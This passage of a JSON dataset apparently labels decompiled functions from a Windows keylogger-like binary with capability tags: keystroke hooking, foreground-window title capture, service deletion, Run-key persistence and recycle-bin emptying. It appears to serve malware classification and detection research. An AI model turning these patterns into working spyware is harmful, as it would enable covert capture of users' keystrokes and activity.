        "decompiled_code": "\nuint8_t fcn.0043b068(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = *0x43b0a4;\n    iVar1 = sub.user32.dll_GetKeyState(0x10);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 1;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x11);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 0x20000000) != 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 172
    },
    "004660f4": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.004660f4(void)\n\n{\n    fcn.0040546c();\n    sub.user32.dll_EnumWindows(fcn.00465ee0, 0);\n    fcn.004054c0();\n    return;\n}\n",
        "token_count": 53
    },
    "00466320": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.00466320(void)\n\n{\n    fcn.0040546c();\n    sub.user32.dll_EnumWindows(fcn.0046611c, 0);\n    fcn.004054c0();\n    return;\n}\n",
        "token_count": 52
    },
    "00466444": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.00466444(void)\n\n{\n    fcn.0040546c();\n    sub.user32.dll_EnumWindows(fcn.00466348, 0);\n    fcn.004054c0();\n    return;\n}\n",
        "token_count": 51
    },
    "0048093c": {
        "rules": [
            "set application hook",
            "log keystrokes via application hook"
        ],
        "decompiled_code": "\nvoid fcn.0048093c(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4809ef;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = sub.kernel32.dll_GetModuleHandleA_2(0, 0);\n    uVar2 = 0xd;\n    *0x49b9a4 = sub.user32.dll_SetWindowsHookExA(0xd, fcn.00480364, uVar1);\n    fcn.0047fb34();\n    fcn.00405738();\n    fcn.00403764();\n    fcn.0047f9f4();\n    fcn.004054c0();\n    fcn.0047f9f4();\n    fcn.004054c0();\n    fcn.0047fb74();\n    fcn.004054c0();\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x4809f6);\n    return;\n}\n",
        "token_count": 297
    },
    "0047f9f4": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.0047f9f4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x47fa61;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.0040546c();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405b8c();\n        uVar3 = fcn.004058fc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.0048bf58();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.0040546c(0x47fa68);\n    return;\n}\n",
        "token_count": 272
    },
    "0048bf90": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.0048bf90(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x48bffd;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.0040546c();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405b8c();\n        uVar3 = fcn.004058fc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.0048bf58();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.0040546c(0x48c004);\n    return;\n}\n",
        "token_count": 270
    },
    "0048d5b4": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.0048d5b4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x48d621;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.0040546c();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405b8c();\n        uVar3 = fcn.004058fc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.00409b98();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.0040546c(0x48d628);\n    return;\n}\n",
        "token_count": 272
    },
    "0048c8d8": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.0048c8d8(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00402ef0();\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1, 0x90);\n    fcn.0048be9c();\n    fcn.00402f0c();\n    return;\n}\n",
        "token_count": 76
    },
    "0048c908": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.0048c908(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00402ef0();\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1, 0x90);\n    fcn.0048be9c();\n    fcn.00402f0c();\n    return;\n}\n",
        "token_count": 74
    },
    "0047174c": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nvoid fcn.0047174c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY68;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x47175e;\n    fcn.004058ec();\n    uStack28 = 0x4717cb;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA(0, 0, 0xf003f);\n    if (iVar1 != 0) {\n        uVar2 = fcn.004058fc(0x10000);\n        iVar3 = sub.advapi32.dll_OpenServiceA(iVar1, uVar2);\n        if (iVar3 != 0) {\n            sub.advapi32.dll_DeleteService(iVar3);\n            sub.advapi32.dll_CloseServiceHandle(iVar3);\n        }\n        sub.advapi32.dll_CloseServiceHandle();\n        iStackY68 = iVar1;\n    }\n    *in_FS_OFFSET = iStackY68;\n    fcn.0040546c(0x4717d2);\n    return;\n}\n",
        "token_count": 306
    },
    "00467d58": {
        "rules": [
            "persist via Run registry key"
        ],
        "decompiled_code": "\nvoid fcn.00467d58(void)\n\n{\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.004218dc();\n    return;\n}\n",
        "token_count": 49
    },
    "0048943c": {
        "rules": [
            "empty the recycle bin"
        ],
        "decompiled_code": "\nvoid fcn.0048943c(void)\n\n{\n    sub.SHELL32.DLL_SHEmptyRecycleBinA(0, 0x48944c, 1);\n    return;\n}\n",
        "token_count": 44
    }
}